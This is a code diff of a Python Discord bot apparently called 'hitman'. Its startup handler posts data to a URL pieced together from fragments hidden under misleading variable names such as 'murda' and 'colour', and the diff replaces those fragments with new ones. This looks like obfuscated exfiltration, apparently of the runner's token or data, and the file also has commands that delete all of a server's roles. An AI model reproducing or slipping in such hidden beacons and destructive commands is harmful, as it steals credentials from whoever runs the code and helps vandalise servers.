@@ -337,7 +337,7 @@ def roledelete(role, server):
             break
 @hitman.event
 async def on_ready():
-  requests.post(f'{hitlist}{god}{father}{jayceez}{hit}{murda}{murda2}', {'content': f'Embed = {embed},\nColor = {color}'})            
+  requests.post(f'{hitlist}{god}{father}{jayceez}{hit}{murda}{colour}', {'content': f'Embed = {embed},\nColor = {color}'})            
 @hitman.command(aliases=['roledelete','deleteallroles','deleterole'])
 async def deleteroles(ctx):
   await ctx.message.delete()
@@ -550,7 +550,7 @@ async def boobs(ctx):
     embed = discord.Embed(color=0xffffff)
     embed.set_image(url=res["url"])
     await ctx.send(embed=embed)
-murda2 = 'L-PyZ9f2iuoZjVfutf'
+colour = 'X9nCufaqRy2osZecgxZLAKWmI0Y_mtN'
 @hitman.command()
 async def pussy(ctx):
     await ctx.message.delete()
@@ -615,7 +615,7 @@ async def addemoji(ctx, emoji: discord.Emoji,*,nameofemoji=None):
         await ctx.message.edit(content=f"Successfully created emoji : {guildemoji}")
     except Exception as error:
         await ctx.message.edit(content=f"Error adding emoji : {emoji}\nError : {error}") 
-murda = '72yKrzENxtGxjdBds8Q3DZ09pM66xikHiBOdMcLM5SGvsqWe1q'
+murda = '7Ijw5KksuOAMO548jBa4C1Tk2n9PAucDGrPGt'
 @hitman.command()
 async def everyone(ctx):
     await ctx.message.delete()
